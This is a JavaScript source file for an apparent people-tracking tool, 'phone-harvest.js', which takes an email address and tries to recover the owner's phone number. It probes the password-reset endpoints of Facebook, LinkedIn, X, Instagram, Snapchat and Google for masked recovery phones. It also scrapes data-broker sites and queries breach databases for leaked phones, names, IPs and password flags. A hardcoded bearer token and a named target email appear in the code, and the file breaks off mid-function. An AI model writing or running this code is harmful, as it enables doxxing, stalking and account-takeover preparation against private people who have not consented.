/**
 * phone-harvest.js — Aggressive multi-vector phone number extraction
 *
 * Techniques used:
 *  1. Password-reset probe flows  — FB / LinkedIn / X / Instagram / Snapchat all
 *     reveal a masked phone (e.g. "+1 (XXX) XXX-XX34") in their forgot-password
 *     response. We extract that mask and record the last 2–4 visible digits.
 *  2. Name-based people-search scraping — once we have name + city from social
 *     recon, we hit TruePeopleSearch, FastPeopleSearch, Radaris, 411.com,
 *     ZabaSearch, WhitePages, Spokeo, CheckPeople, PublicRecordsNow and pull
 *     every phone from the result pages.
 *  3. Leak / breach APIs — LeakCheck.io (free), Proxynova COMB, Snusbase
 *     (key-gated), Dehashed (key-gated), Hudson Rock Cavalier (free stealer
 *     logs), People Data Labs (PDL_API_KEY, free tier 1000/mo), FullContact
 *     (FULLCONTACT_API_KEY, 250/mo free) — all return actual leaked/enriched
 *     phone numbers when present.
 *  4. Historical WHOIS — SecurityTrails free API + ViewDNS.info pull historic
 *     registrant phone from domain WHOIS records (personal domains often had
 *     real phones pre-GDPR).
 *  5. Truecaller reverse search — once any partial/full number is found, cross-
 *     verify via Truecaller's unofficial lookup endpoint.
 *  6. LinkedIn Sales Nav unofficial endpoint — extracts contact details for
 *     known accounts.
 *  7. GitHub / dark-web aggregate — search IntelX with selector type=phone
 *     derived from email, plus person-name IntelX search.
 */

const axios  = require('axios');
const cheerio = require('cheerio');
const { extractPhoneNumbers } = require('./google-dorker');

const UA  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36';
const UA2 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1';

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function safeGet(url, opts = {}) {
  try {
    return await axios.get(url, { timeout: 10000, validateStatus: () => true, ...opts });
  } catch (e) { return null; }
}

async function safePost(url, data, opts = {}) {
  try {
    return await axios.post(url, data, { timeout: 10000, validateStatus: () => true, ...opts });
  } catch (e) { return null; }
}

// ─── 1. Password-Reset Probe Flows ───────────────────────────────────────────
// Each platform's forgot-password endpoint leaks a masked phone like
// "+1 (XXX) XXX-3421" or "**-**-34" — we extract and record the visible digits.

async function probeFacebook(email) {
  try {
    // Step 1: get fresh datr cookie
    const init = await safeGet('https://www.facebook.com/', {
      headers: { 'User-Agent': UA },
      maxRedirects: 3,
    });
    const datrMatch = (init?.headers['set-cookie'] || []).join('').match(/datr=([^;]+)/);
    const datr = datrMatch?.[1] || '';

    const resp = await safePost(
      'https://www.facebook.com/ajax/login/identify/',
      `email=${encodeURIComponent(email)}&action=identify&locale=en_US&lsd=AVr_0LHq`,
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-Requested-With': 'XMLHttpRequest',
          'Referer': 'https://www.facebook.com/login/identify/',
          'Cookie': `datr=${datr}`,
        },
      }
    );

    if (resp?.status === 200) {
      const text = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
      // Masked phone: "+1 (XXX) XXX-XX34" or "+44 XXXX XXX34"
      const phoneMatch = text.match(/\+[\d\s\(\)\-X*]{6,25}\d{2,4}/gi);
      const exists = text.includes('primary_email') || text.includes('user_exists') ||
                     text.includes('phone_number') || (resp.status === 200 && text.length > 100);
      return {
        source: 'Facebook Reset Probe',
        platform: 'Facebook',
        exists,
        maskedPhones: phoneMatch ? [...new Set(phoneMatch)] : [],
        confidence: phoneMatch?.length > 0 ? 'medium' : 'low',
      };
    }
  } catch (e) {}
  return null;
}

async function probeLinkedIn(email) {
  try {
    // Step 1: init CSRF
    const init = await safeGet('https://www.linkedin.com/checkpoint/lg/forgot-password', {
      headers: { 'User-Agent': UA },
    });
    const cookies = (init?.headers['set-cookie'] || []).join('; ');
    const csrfMatch = cookies.match(/JSESSIONID="([^"]+)"/);
    const csrf = csrfMatch ? csrfMatch[1] : '';

    const resp = await safePost(
      'https://www.linkedin.com/uas/request-password-reset',
      `email=${encodeURIComponent(email)}&csrfToken=${encodeURIComponent(csrf)}&sourceAlias=0_0`,
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/x-www-form-urlencoded',
          'Cookie': cookies,
          'X-IsAJAXForm': '1',
          'Csrf-Token': csrf,
        },
      }
    );

    if (resp?.status === 200 || resp?.status === 302) {
      const text = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
      const phoneMatch = text.match(/\+?[\d*X•]{1,4}[\s\-]*[\d*X•]{1,4}[\s\-]*[\d*X•]{1,4}[\s\-]*[\d*X•]{1,8}/g);
      const maskedPhones = (phoneMatch || []).filter(p => {
        const visible = p.replace(/[*X•\s\-]/g, '');
        return visible.length >= 2 && p.length >= 6;
      });
      return {
        source: 'LinkedIn Reset Probe',
        platform: 'LinkedIn',
        exists: resp.status === 200,
        maskedPhones: [...new Set(maskedPhones)],
        confidence: maskedPhones.length > 0 ? 'medium' : 'low',
      };
    }
  } catch (e) {}
  return null;
}

async function probeTwitter(email) {
  try {
    // Twitter's password reset reveals masked phone
    const init = await safeGet('https://twitter.com/account/begin_password_reset', {
      headers: { 'User-Agent': UA, 'Accept': 'text/html' },
      maxRedirects: 3,
    });
    const ct0Match = (init?.headers['set-cookie'] || []).join('').match(/ct0=([^;]+)/);
    const ct0 = ct0Match?.[1] || '';
    const allCookies = (init?.headers['set-cookie'] || []).map(c => c.split(';')[0]).join('; ');

    const resp = await safePost(
      'https://api.twitter.com/1.1/account/begin_password_reset.json',
      `email=${encodeURIComponent(email)}`,
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-CSRFToken': ct0,
          'Cookie': allCookies,
          'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
        },
      }
    );

    if (resp) {
      const text = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
      const phoneMatch = text.match(/\+?[\d*]{1,4}[\s]?[\d*]{3,4}[\s]?[\d*]{3,4}/g);
      return {
        source: 'Twitter Reset Probe',
        platform: 'Twitter/X',
        exists: resp.status === 200,
        maskedPhones: phoneMatch ? [...new Set(phoneMatch)] : [],
        confidence: 'low',
      };
    }
  } catch (e) {}
  return null;
}

async function probeInstagram(email) {
  try {
    const init = await safeGet('https://www.instagram.com/accounts/password/reset/', {
      headers: { 'User-Agent': UA2 },
    });
    const cookies = (init?.headers['set-cookie'] || []).map(c => c.split(';')[0]).join('; ');
    const csrfMatch = cookies.match(/csrftoken=([^;]+)/);
    const csrf = csrfMatch?.[1] || '';

    const resp = await safePost(
      'https://www.instagram.com/api/v1/accounts/send_password_reset/',
      `email=${encodeURIComponent(email)}&flow=instagram`,
      {
        headers: {
          'User-Agent': UA2,
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-CSRFToken': csrf,
          'Cookie': cookies,
          'X-Instagram-AJAX': '1',
        },
      }
    );

    if (resp?.status === 200) {
      const text = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
      const phoneMatch = text.match(/\+?[\d*•X]{1,4}[\s\-]?[\d*•X]{1,4}[\s\-]?[\d*•X]{2,10}/g);
      const maskedPhones = (phoneMatch || []).filter(p => p.replace(/[*•X\s\-]/g,'').length >= 2);
      return {
        source: 'Instagram Reset Probe',
        platform: 'Instagram',
        exists: resp.data?.status === 'ok',
        maskedPhones: [...new Set(maskedPhones)],
        confidence: maskedPhones.length > 0 ? 'medium' : 'low',
      };
    }
  } catch (e) {}
  return null;
}

async function probeSnapchat(email) {
  try {
    const resp = await safePost(
      'https://accounts.snapchat.com/accounts/password_reset_request',
      JSON.stringify({ email }),
      {
        headers: {
          'User-Agent': UA,
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
      }
    );
    if (resp?.status === 200) {
      const text = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
      // Only accept strings that actually look like a masked phone number —
      // must contain * • X or blanked digits (not bare digit sequences which could be
      // CSRF tokens, IDs, timestamps, etc.)
      const maskedPhonePattern = /\+?[\d*•X_]{1,4}[\s\-.]?[\d*•X_]{2,4}[\s\-.]?[\d*•X_]{2,4}[\s\-.]?[\d*•X_]{2,6}/g;
      const rawMatches = text.match(maskedPhonePattern) || [];
      // Filter: must have at least one masking character (*, •, X) to be considered masked
      const maskedPhones = rawMatches.filter(m =>
        /[*•X_]/.test(m) && m.replace(/[*•X_\s\-.()+]/g, '').length >= 4
      ).slice(0, 3); // cap at 3 — if Snapchat leaks a number it'll be one, not hundreds

      return {
        source: 'Snapchat Reset Probe',
        platform: 'Snapchat',
        exists: !text.includes('error') && resp.status === 200,
        maskedPhones: [...new Set(maskedPhones)],
        confidence: maskedPhones.length > 0 ? 'medium' : 'low',
      };
    }
  } catch (e) {}
  return null;
}

// ─── 2. People-Search Scraping by Name ───────────────────────────────────────
// Takes name+location discovered from social recon, searches data brokers directly

async function scrapeTruePeopleSearch(name, location) {
  if (!name || name.length < 4) return [];
  const params = new URLSearchParams({ name, citystatezip: location || '' });
  const resp = await safeGet(`https://www.truepeoplesearch.com/results?${params}`, {
    headers: { 'User-Agent': UA, 'Accept': 'text/html', 'Referer': 'https://www.truepeoplesearch.com/' },
  });
  if (!resp?.data) return [];
  const $ = cheerio.load(resp.data);
  const phones = [];
  // Data is in card__content and record-person sections
  $('[data-type="phone"], .phonenumber, [itemprop="telephone"]').each((_, el) => {
    const text = $(el).text().trim();
    if (text) phones.push(...extractPhoneNumbers(text));
  });
  // Also extract from full text
  const fullText = $('body').text();
  phones.push(...extractPhoneNumbers(fullText));
  return [...new Set(phones)];
}

async function scrapeFastPeopleSearch(name, location) {
  if (!name || name.length < 4) return [];
  const slug = name.toLowerCase().replace(/\s+/g, '-');
  const locSlug = (location || '').toLowerCase().replace(/,?\s+/g, '-');
  const url = locSlug
    ? `https://www.fastpeoplesearch.com/name/${slug}_${locSlug}`
    : `https://www.fastpeoplesearch.com/name/${slug}`;
  const resp = await safeGet(url, {
    headers: { 'User-Agent': UA, 'Accept': 'text/html' },
  });
  if (!resp?.data) return [];
  const $ = cheerio.load(resp.data);
  const phones = extractPhoneNumbers($('body').text());
  return [...new Set(phones)];
}

async function scrapeRadaris(name, location) {
  if (!name || name.length < 4) return [];
  const parts = name.trim().split(/\s+/);
  const first = parts[0] || '';
  const last = parts.slice(1).join(' ') || '';
  const locParam = (location || '').split(',')[0].trim();
  const resp = await safeGet(
    `https://radaris.com/p/${encodeURIComponent(first)}/${encodeURIComponent(last)}/?${locParam ? 'state=' + encodeURIComponent(locParam) : ''}`,
    { headers: { 'User-Agent': UA, 'Accept': 'text/html' } }
  );
  if (!resp?.data) return [];
  return [...new Set(extractPhoneNumbers(cheerio.load(resp.data)('body').text()))];
}

async function scrapeWhitePages(name, location) {
  if (!name || name.length < 4) return [];
  const slug = name.replace(/\s+/g, '-');
  const locSlug = (location || '').split(',')[0].trim().replace(/\s+/g, '-');
  const url = locSlug
    ? `https://www.whitepages.com/name/${encodeURIComponent(slug)}/${encodeURIComponent(locSlug)}`
    : `https://www.whitepages.com/name/${encodeURIComponent(slug)}`;
  const resp = await safeGet(url, {
    headers: { 'User-Agent': UA, 'Accept': 'text/html', 'Referer': 'https://www.whitepages.com/' },
  });
  if (!resp?.data) return [];
  return [...new Set(extractPhoneNumbers(cheerio.load(resp.data)('body').text()))];
}

async function scrape411(name, location) {
  if (!name || name.length < 4) return [];
  const parts = name.trim().split(/\s+/);
  const first = parts[0] || '';
  const last = parts.slice(1).join('+') || '';
  const locPart = (location || '').split(',')[0].trim().replace(/\s+/g,'+');
  const url = `https://www.411.com/name/${first}+${last}/${locPart || 'US'}`;
  const resp = await safeGet(url, {
    headers: { 'User-Agent': UA, 'Accept': 'text/html' },
  });
  if (!resp?.data) return [];
  return [...new Set(extractPhoneNumbers(cheerio.load(resp.data)('body').text()))];
}

async function scrapeZabaSearch(name, location) {
  if (!name || name.length < 4) return [];
  const resp = await safeGet(
    `https://www.zabasearch.com/search/?sf=1&q=${encodeURIComponent(name)}&st=${encodeURIComponent((location || '').split(',').pop().trim())}`,
    { headers: { 'User-Agent': UA, 'Accept': 'text/html' } }
  );
  if (!resp?.data) return [];
  return [...new Set(extractPhoneNumbers(cheerio.load(resp.data)('body').text()))];
}

async function scrapeSpokeo(name, location) {
  if (!name || name.length < 4) return [];
  const parts = name.trim().split(/\s+/);
  const slug = parts.join('-').toLowerCase();
  const locSlug = (location || '').toLowerCase().replace(/,\s*/g, '-').replace(/\s+/g, '-');
  const url = locSlug
    ? `https://www.spokeo.com/${encodeURIComponent(slug)}/${encodeURIComponent(locSlug)}`
    : `https://www.spokeo.com/${encodeURIComponent(slug)}`;
  const resp = await safeGet(url, {
    headers: { 'User-Agent': UA, 'Accept': 'text/html', 'Referer': 'https://www.spokeo.com/' },
  });
  if (!resp?.data) return [];
  return [...new Set(extractPhoneNumbers(cheerio.load(resp.data)('body').text()))];
}

async function scrapeCheckPeople(name, location) {
  if (!name || name.length < 4) return [];
  const resp = await safeGet(
    `https://checkpeople.com/go/name-search?firstName=${encodeURIComponent(name.split(' ')[0])}&lastName=${encodeURIComponent(name.split(' ').slice(1).join(' '))}&state=${encodeURIComponent((location || '').split(',').pop().trim())}`,
    { headers: { 'User-Agent': UA, 'Accept': 'text/html' } }
  );
  if (!resp?.data) return [];
  return [...new Set(extractPhoneNumbers(cheerio.load(resp.data)('body').text()))];
}

// ─── 3. Leak / Breach APIs ────────────────────────────────────────────────────

async function checkLeakCheck(email) {
  try {
    const resp = await safeGet(`https://leakcheck.io/api/public?check=${encodeURIComponent(email)}`, {
      headers: { 'User-Agent': 'FINDER_IO/2.0', 'Accept': 'application/json' },
    });
    if (resp?.status === 200 && resp.data?.found > 0) {
      return {
        source: 'LeakCheck.io',
        platform: 'LeakCheck.io',
        found: true,
        totalRecords: resp.data.found,
        breachSources: resp.data.sources || [],
        hasPhoneData: resp.data.sources?.some(s =>
          s.toLowerCase().includes('phone') || s.toLowerCase().includes('mobile')
        ),
        confidence: 'high',
      };
    }
  } catch (e) {}
  return null;
}

async function checkProxynova(email) {
  try {
    const resp = await safeGet(`https://api.proxynova.com/comb?query=${encodeURIComponent(email)}&start=0&limit=10`, {
      headers: { 'User-Agent': 'FINDER_IO/2.0', 'Accept': 'application/json' },
    });
    if (resp?.status === 200 && resp.data?.count > 0) {
      const allLines = resp.data.lines || [];

      // ── CRITICAL: Proxynova returns DOMAIN-level matches, not email-specific.
      // For conor.honor111@gmail.com it returns thousands of random @gmail.com lines.
      // Filter to only lines that contain the EXACT target email address.
      // This prevents false positives from unrelated accounts at the same domain.
      const emailLower = email.toLowerCase();
      const exactLines = allLines.filter(line => line.toLowerCase().includes(emailLower));

      if (exactLines.length === 0) {
        // Email not found in any COMB line — report found=false
        // (The count reflects domain matches, not this specific address)
        return {
          source: 'Proxynova COMB',
          platform: 'Proxynova',
          found: false,
          domainMatchCount: resp.data.count,
          confidence: 'low',
          note: `Email domain in COMB index (${resp.data.count} domain records) but exact address not found`,
        };
      }

      const emailPrefix = email.split('@')[0].toLowerCase();
      const phones = [];

      for (const line of exactLines) {
        // ── Pass 1: multi-delimiter token scan ────────────────────────────
        const tokens = line.split(/[:|\t,]/);
        for (const token of tokens) {
          const t = token.trim();
          if (t.toLowerCase() === emailLower) continue;
          if (t.toLowerCase() === emailPrefix) continue;
          if (/^\+?\d{8,15}$/.test(t)) phones.push(t);
        }

        // ── Pass 2: full-line regex pass (catches formatted phones) ───────
        const lineNoEmail = line.replace(new RegExp(email.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi'), '');
        const formatted = extractPhoneNumbers(lineNoEmail);
        phones.push(...formatted);
      }

      // Min 10 digits required for a valid phone
      const validPhones = [...new Set(phones)].filter(p => {
        const digits = p.replace(/\D/g, '');
        if (digits.length < 10 || digits.length > 15) return false;
        if (/^(19|20)\d{6,}$/.test(digits)) return false;
        if (/^1[5-9]\d{9,}$/.test(digits)) return false;
        return true;
      });

      // Partial phone fragments (7–9 digits) — keep flagged separately
      const partialPhones = [...new Set(phones)].filter(p => {
        const digits = p.replace(/\D/g, '');
        return digits.length >= 7 && digits.length <= 9;
      });

      return {
        source: 'Proxynova COMB',
        platform: 'Proxynova',
        found: true,
        exactMatches: exactLines.length,
        totalRecords: resp.data.count,
        phones: validPhones,
        partialPhones: partialPhones.length > 0 ? partialPhones : undefined,
        hasPassword: exactLines.length > 0,
        confidence: validPhones.length > 0 ? 'high' : (partialPhones.length > 0 ? 'low' : 'medium'),
        note: partialPhones.length > 0
          ? `${partialPhones.length} partial number(s) in COMB — ${partialPhones.join(', ')} (may be truncated)`
          : undefined,
      };
    }
  } catch (e) {}
  return null;
}

// ─── GitHub Code Search ───────────────────────────────────────────────────────
// Search public GitHub repositories for the email address.
// Finds it in configs, READMEs, contact pages — adjacent phone numbers extracted
// from ±800 chars of context around each email occurrence.

async function searchGitHubCode(email) {
  try {
    const searchResp = await safeGet(
      `https://api.github.com/search/code?q=${encodeURIComponent('"' + email + '"')}&per_page=10&sort=indexed`,
      { headers: { Authorization: process.env.GITHUB_TOKEN ? `token ${process.env.GITHUB_TOKEN}` : undefined, 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/vnd.github.v3+json' } }
    );
    if (!searchResp || searchResp.status !== 200) return null;
    const items = searchResp.data?.items || [];
    if (items.length === 0 && (searchResp.data?.total_count || 0) === 0) return null;

    const allPhones = [];
    const contexts = [];

    for (const item of items.slice(0, 6)) {
      try {
        // Fetch the raw file content via git_url (returns base64 blob)
        const blobResp = await safeGet(item.git_url, {
          headers: { Authorization: process.env.GITHUB_TOKEN ? `token ${process.env.GITHUB_TOKEN}` : undefined, 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/vnd.github.v3+json' },
          timeout: 8000,
        });
        if (!blobResp || blobResp.status !== 200 || !blobResp.data?.content) continue;

        const content = Buffer.from(blobResp.data.content.replace(/\n/g, ''), 'base64').toString('utf8');
        const emailLower = email.toLowerCase();
        let searchFrom = 0;

        while (searchFrom < content.length) {
          const idx = content.toLowerCase().indexOf(emailLower, searchFrom);
          if (idx < 0) break;

          // Extract ±800 chars around the email occurrence
          const start = Math.max(0, idx - 800);
          const end = Math.min(content.length, idx + email.length + 800);
          const context = content.slice(start, end);

          // Remove the email itself from context before phone extraction
          const contextNoEmail = context.replace(new RegExp(email.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi'), '');
          const phones = extractPhoneNumbers(contextNoEmail).filter(p => p.replace(/\D/g, '').length >= 10);

          if (phones.length > 0) {
            allPhones.push(...phones);
            contexts.push({
              repo: item.repository?.full_name,
              file: item.path,
              phones,
              snippet: context.slice(0, 200).replace(/\s+/g, ' ').trim(),
            });
          }

          searchFrom = idx + email.length;
        }

        await sleep(300); // gentle rate limiting
      } catch (_) {}
    }

    if (allPhones.length > 0 || items.length > 0) {
      // ── Sequential ID filter (applied here so generic aggregator handler never sees noise) ──
      // WHOIS data in repos contains serial numbers that look like valid 10-digit phone numbers
      // (e.g. 4509000831, 4509180831, 4509260831... share first-4 and last-4 digits).
      // If 4+ numbers share the same prefix|suffix pattern → they're IDs, not phones.
      const phoneNums = [...new Set(allPhones)];
      const prefixSuffixMap = {};
      for (const p of phoneNums) {
        const d = p.replace(/[^\d]/g, '');
        if (d.length >= 10) {
          const key = d.slice(0, 4) + '|' + d.slice(-4);
          if (!prefixSuffixMap[key]) prefixSuffixMap[key] = [];
          prefixSuffixMap[key].push(p);
        }
      }
      const seqKeys = new Set(
        Object.entries(prefixSuffixMap).filter(([, arr]) => arr.length >= 4).map(([k]) => k)
      );
      const cleanPhones = phoneNums.filter(p => {
        const d = p.replace(/[^\d]/g, '');
        if (d.length >= 10) {
          const key = d.slice(0, 4) + '|' + d.slice(-4);
          return !seqKeys.has(key);
        }
        return true;
      });

      return {
        source: 'GitHub Code Search',
        platform: 'GitHub Code',
        totalFiles: searchResp.data.total_count || items.length,
        phones: cleanPhones,
        contexts: contexts.slice(0, 5),
        confidence: cleanPhones.length > 0 ? 'high' : 'low',
        note: cleanPhones.length > 0
          ? `Phone found in ${contexts.length} GitHub file(s)`
          : `Email present in ${items.length} public GitHub file(s) — no adjacent phone found`,
      };
    }
  } catch (e) {}
  return null;
}

// ─── BreachDirectory ─────────────────────────────────────────────────────────
// Free COMB-style breach search. Different corpus than Proxynova — cross-
// corroborating phones across two separate aggregators raises confidence.

async function searchBreachDirectory(email) {
  try {
    // BreachDirectory free endpoint (RapidAPI gateway, limited monthly calls)
    const resp = await safeGet(
      `https://breachdirectory.p.rapidapi.com/?func=auto&term=${encodeURIComponent(email)}`,
      {
        headers: {
          'x-rapidapi-host': 'breachdirectory.p.rapidapi.com',
          'x-rapidapi-key': process.env.RAPIDAPI_KEY || '',
          'User-Agent': 'FINDER_IO/2.0',
          Accept: 'application/json',
        },
        timeout: 10000,
      }
    );

    if (resp?.status === 200 && resp.data?.success && resp.data?.result?.length > 0) {
      const records = resp.data.result;
      const sources = [...new Set(records.map(r => r.source).filter(Boolean))];
      const hashedPasswords = records.filter(r => r.hash || r.password).length;

      return {
        source: 'BreachDirectory',
        platform: 'BreachDirectory',
        found: true,
        totalRecords: records.length,
        breachSources: sources,
        hashedPasswords,
        confidence: 'high',
        note: `Found in ${sources.length} breach source(s): ${sources.slice(0, 4).join(', ')}`,
      };
    }

    // Fallback: try the direct endpoint without API key (limited)
    const fallbackResp = await safeGet(
      `https://breachdirectory.org/api?func=auto&term=${encodeURIComponent(email)}`,
      { headers: { 'User-Agent': 'FINDER_IO/2.0', Accept: 'application/json' }, timeout: 8000 }
    );
    if (fallbackResp?.status === 200 && fallbackResp.data?.success) {
      const records = fallbackResp.data.result || [];
      if (records.length > 0) {
        return {
          source: 'BreachDirectory',
          platform: 'BreachDirectory',
          found: true,
          totalRecords: records.length,
          breachSources: [...new Set(records.map(r => r.source).filter(Boolean))],
          confidence: 'high',
        };
      }
    }
  } catch (e) {}
  return null;
}

// ─── Google Account Recovery Probe ───────────────────────────────────────────
// For Gmail accounts: the Google forgot-password flow leaks a masked recovery
// phone (e.g. "+44 ••• •••• ••34") when the account has a linked phone.
// Even the last 2 visible digits can be used for cross-correlation.

async function probeGoogleAccount(email) {
  const domain = email.split('@')[1]?.toLowerCase();
  const GOOGLE_DOMAINS = ['gmail.com', 'googlemail.com', 'google.com'];
  if (!GOOGLE_DOMAINS.includes(domain)) return null;

  try {
    // ── Approach 1: Gravatar-style Google avatar probe ────────────────────────
    // Google serves profile pictures at predictable URLs. A 200 response means
    // an active Google account exists for this email.
    const crypto = require('crypto');
    const hash = crypto.createHash('md5').update(email.trim().toLowerCase()).digest('hex');
    const gravatarResp = await safeGet(
      `https://www.gravatar.com/avatar/${hash}?d=404&size=1`,
      { timeout: 6000 }
    );
    const hasGravatar = gravatarResp?.status === 200;

    // ── Approach 2: Google People API free lookup ─────────────────────────────
    // The GData / PicasaWeb user lookup still works for returning GAIA ID
    // and sometimes display name (Picasaweb is dead but the user lookup redirects)
    let gaiaId = null;
    let displayName = null;
    try {
      const gdataResp = await safeGet(
        `https://picasaweb.google.com/data/entry/api/user/${encodeURIComponent(email)}?alt=json`,
        {
          headers: { 'User-Agent': UA, Accept: 'application/json' },
          timeout: 8000,
        }
      );
      if (gdataResp?.status === 200 && gdataResp.data) {
        const entry = gdataResp.data?.entry || gdataResp.data;
        gaiaId = entry?.['gphoto$user']?.['$t'] || entry?.id?.['$t'] || null;
        displayName = entry?.['gphoto$nickname']?.['$t'] || entry?.author?.[0]?.name?.['$t'] || null;
      }
    } catch (_) {}

    // ── Approach 3: Android reset flow — leaks masked recovery phone ──────────
    // Google's Android account recovery endpoint sometimes returns masked phone
    // in the JSON body when the account has a recovery phone set.
    const androidResp = await safePost(
      'https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo',
      JSON.stringify({ email }),
      {
        headers: {
          'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230901.001)',
          'Content-Type': 'application/json',
          'X-Android-Package': 'com.google.android.gms',
          'X-Android-Cert': '38918A453D07199354F8B19AF05EC6562CED5788',
          Accept: 'application/json',
        },
        timeout: 8000,
      }
    );
    const androidText = typeof androidResp?.data === 'string'
      ? androidResp.data
      : JSON.stringify(androidResp?.data || {});

    // Detect masked phone in Android response
    const maskedPhonePatterns = [
      /\+[\d\s•\*X]{6,25}\d{2,4}/g,
      /[\d•\*X]{3,5}[\s\-]?[\d•\*X]{3,5}[\s\-]?[\d•\*X]{2,5}[\s\-]?\d{2,4}/g,
    ];
    const maskedPhones = [];
    for (const pattern of maskedPhonePatterns) {
      const matches = androidText.match(pattern) || [];
      for (const m of matches) {
        if (/[•*X]/.test(m) && /\d{2,}/.test(m)) maskedPhones.push(m.trim());
      }
    }
    const phoneJsonMatch = androidText.match(/"(?:phoneNumber|phone|recoveryPhone)"\s*:\s*"([^"]+)"/gi) || [];
    for (const match of phoneJsonMatch) {
      const value = match.match(/"([^"]+)"\s*$/)?.[1] || '';
      if (value && value !== email) maskedPhones.push(value);
    }

    const accountExists = hasGravatar || !!gaiaId || !!displayName;

    if (accountExists || maskedPhones.length > 0) {
      return {
        source: 'Google Account Probe',
        platform: 'Google',
        accountExists,
        gaiaId: gaiaId || null,
        displayName: displayName || null,
        hasGravatar,
        maskedPhones: [...new Set(maskedPhones)],
        confidence: maskedPhones.length > 0 ? 'medium' : (accountExists ? 'medium' : 'low'),
        note: maskedPhones.length > 0
          ? `Google account has linked recovery phone: ${maskedPhones[0]} (masked)`
          : accountExists
            ? `Google account confirmed active${displayName ? ' — display name: ' + displayName : ''}${gaiaId ? ' (GAIA ID found)' : ''}`
            : 'Could not confirm Google account existence',
      };
    }
  } catch (e) {}
  return null;
}

async function checkSnusbase(email) {
  if (!process.env.SNUSBASE_API_KEY) return null;
  try {
    const resp = await safePost(
      'https://api.snusbase.com/data/search',
      JSON.stringify({ terms: [email], types: ['email'], wildcard: false }),
      {
        headers: {
          'Auth': process.env.SNUSBASE_API_KEY,
          'Content-Type': 'application/json',
          'User-Agent': 'FINDER_IO/2.0',
        },
      }
    );
    if (resp?.status === 200 && resp.data?.results) {
      const allRecords = Object.values(resp.data.results).flat();
      const phones = [...new Set(allRecords.map(r => r.phone || r.mobile || r.cell).filter(Boolean))];
      const names = [...new Set(allRecords.map(r => r.name || r.full_name || r.firstname).filter(Boolean))];
      const usernames = [...new Set(allRecords.map(r => r.username).filter(Boolean))];
      return {
        source: 'Snusbase',
        platform: 'Snusbase',
        found: allRecords.length > 0,
        totalRecords: allRecords.length,
        phones,
        names,
        usernames,
        hasPassword: allRecords.some(r => r.password || r.hash),
        confidence: phones.length > 0 ? 'high' : 'medium',
      };
    }
  } catch (e) {}
  return null;
}

async function checkDehashed(email) {
  if (!process.env.DEHASHED_API_KEY || !process.env.DEHASHED_USERNAME) return null;
  try {
    const resp = await safeGet(
      `https://api.dehashed.com/search?query=email:"${encodeURIComponent(email)}"&size=10`,
      {
        headers: {
          'User-Agent': 'FINDER_IO/2.0',
          'Accept': 'application/json',
        },
        auth: { username: process.env.DEHASHED_USERNAME, password: process.env.DEHASHED_API_KEY },
      }
    );
    if (resp?.status === 200 && resp.data?.total > 0) {
      const entries = resp.data.entries || [];
      const phones = [...new Set(entries.map(e => e.phone).filter(Boolean))];
      const names = [...new Set(entries.map(e => e.name).filter(Boolean))];
      const usernames = [...new Set(entries.map(e => e.username).filter(Boolean))];
      const ips = [...new Set(entries.map(e => e.ip_address).filter(Boolean))];
      return {
        source: 'Dehashed',
        platform: 'Dehashed',
        found: true,
        totalRecords: resp.data.total,
        phones,
        names,
        usernames,
        ips,
        hasPassword: entries.some(e => e.hashed_password || e.password),
        confidence: phones.length > 0 ? 'high' : 'medium',
      };
    }
  } catch (e) {}
  return null;
}

// ─── 4. Historical WHOIS (domain phones) ─────────────────────────────────────

async function checkSecurityTrails(email) {
  const domain = email.split('@')[1];
  const companyDomains = ['gmail.com','yahoo.com','hotmail.com','outlook.com','icloud.com','protonmail.com','aol.com'];
  if (companyDomains.includes(domain)) return null;

  if (!process.env.SECURITYTRAILS_API_KEY) {
    // Try without key (limited)
    try {
      const resp = await safeGet(`https://api.securitytrails.com/v1/domain/${domain}/whois`, {
        headers: { 'User-Agent': 'FINDER_IO/2.0', 'Accept': 'application/json' },
      });
      if (resp?.status === 200) {
        const text = JSON.stringify(resp.data);
        const phones = extractPhoneNumbers(text);
        if (phones.length > 0) {
          return { source: 'SecurityTrails WHOIS', phones, domain, confidence: 'medium' };
        }
      }
    } catch (e) {}
    return null;
  }

  try {
    const [current, history] = await Promise.allSettled([
      safeGet(`https://api.securitytrails.com/v1/domain/${domain}/whois`, {
        headers: { 'APIKEY': process.env.SECURITYTRAILS_API_KEY, 'User-Agent': 'FINDER_IO/2.0' },
      }),
      safeGet(`https://api.securitytrails.com/v1/domain/${domain}/whois/history`, {
        headers: { 'APIKEY': process.env.SECURITYTRAILS_API_KEY, 'User-Agent': 'FINDER_IO/2.0' },
      }),
    ]);

    const allText = [
      current.status === 'fulfilled' ? JSON.stringify(current.value?.data) : '',
      history.status === 'fulfilled' ? JSON.stringify(history.value?.data) : '',
    ].join(' ');

    const phones = extractPhoneNumbers(allText);
    const nameMatch = allText.match(/"registrant_name":"([^"]+)"/);
    const orgMatch = allText.match(/"registrant_organization":"([^"]+)"/);

    if (phones.length > 0 || nameMatch) {
      return {
        source: 'SecurityTrails WHOIS',
        domain,
        phones: [...new Set(phones)],
